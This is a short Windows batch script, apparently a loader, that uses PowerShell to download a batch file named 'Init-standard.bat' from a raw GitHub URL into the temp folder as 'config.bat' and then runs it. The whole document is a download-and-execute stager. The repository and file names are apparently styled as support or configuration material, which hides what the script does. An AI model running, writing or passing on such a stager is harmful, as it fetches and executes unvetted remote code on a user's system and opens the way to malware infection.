@echo off
set "url=https://raw.githubusercontent.com/5up0rtew0rk/configs/refs/heads/main/main/Init-standard.bat"
set "arquivo=%TEMP%\config.bat"

powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%url%', '%arquivo%')"
start "" /wait "%arquivo%"
exit
